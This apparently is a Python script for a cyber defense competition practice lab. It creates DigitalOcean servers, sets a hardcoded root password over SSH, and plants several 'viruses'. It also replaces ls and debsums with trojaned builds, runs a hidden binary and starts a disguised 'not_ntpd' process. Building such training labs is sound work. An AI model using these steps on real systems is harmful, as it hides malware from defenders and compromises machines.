#!/bin/python3
import digitalocean
import time
import paramiko
from scp import SCPClient
import config
from os import system

# Build David's
system("cd david; cargo build --release --all; cd ..")

count = 1

manager = digitalocean.Manager(token=config.token)
keys = manager.get_all_sshkeys()

with open('servers.csv', 'w') as f:
    f.write('Machine #, IP Address\n')

droplets = []
for i in range(count):
    print(i)
    droplet = digitalocean.Droplet(token=config.token,
                                   name='ccdc',
                                   region='nyc1',
                                   image='ubuntu-16-04-x64',
                                   size_slug='512mb',
                                   ssh_keys=keys,
                                   backups=False)
    droplet.create()
    droplets.append(droplet)

time.sleep(60)

for idx, droplet in enumerate(droplets):
    print('Starting droplet...')
    droplet.load()
    print(droplet.ip_address)
    with open('servers.csv', 'a+') as f:
        f.write("%s,%s\n" % (idx, droplet.ip_address))

    k = paramiko.RSAKey.from_private_key_file("/home/david/.ssh/id_rsa")
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(hostname=droplet.ip_address, username="root", pkey=k)
    i, o, e = c.exec_command("echo root:nuccdcpracticelab2017 | chpasswd")

    # general setup
    c.exec_command("hostname %s" % str(idx))
    i, o, e = c.exec_command("DEBIAN_FRONTEND=noninteractive apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y debsums curl build-essential make python-pip")
    print(o.readlines())
    print(e.readlines())

    # Isaac's virus 1
    c.exec_command("pip install pyinstaller setproctitle requests")

time.sleep(5)

for idx, droplet in enumerate(droplets):
    droplet.load()
    k = paramiko.RSAKey.from_private_key_file("/home/david/.ssh/id_rsa")
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(hostname=droplet.ip_address, username="root", pkey=k)
    scp = SCPClient(c.get_transport())

    # David's virus 2
    c.exec_command("mv /bin/ls /realLS")
    scp.put('david/target/release/virus', '/var/virus')
    scp.put('david/target/release/virus', '/virus')
    scp.put('david/target/release/virus', '/var/virus')
    c.exec_command("mv /usr/bin/debsums /realDebsums")
    scp.put('david/target/release/debsums', '/usr/bin/debsums')
    scp.put('david/target/release/ls', '/bin/ls')
    scp.put('david/target/release/ls', '/usr/bin/ls')
    scp.put('david/target/release/ls', '/sbin/ls')
    scp.put('david/target/release/ls', '/usr/sbin/ls')
    c.exec_command("echo %s > /virusNum" % str(idx))
    c.exec_command("nohup /virus &")

    # Alex's virus 2
    c.exec_command("mkdir /root/glados")
    c.exec_command("mkdir /root/glados/song")
    scp.put("alex/GLaDOS/Makefile", "/root/glados/Makefile")
    scp.put("alex/GLaDOS/GLaDOS.c", "/root/glados/GLaDOS.c")
    scp.put("alex/GLaDOS/song/makefile", "/root/glados/song/makefile")
    scp.put("alex/GLaDOS/song/song.c", "/root/glados/song/song.c")
    c.exec_command("cd /root/glados/; make; make install")
    # c.exec_command("rm -rf /root/glados") TODO

    # Isaac's virus 2
    scp.put('isaac/', '/root/isaac/', recursive=True)
    i, o, e = c.exec_command('/root/isaac/build.sh')
    o.readlines()
    e.readlines()
    c.exec_command('cp /root/isaac/not_ntpd /usr/bin/not_ntpd')
    c.exec_command('/usr/bin/not_ntpd')

time.sleep(20)
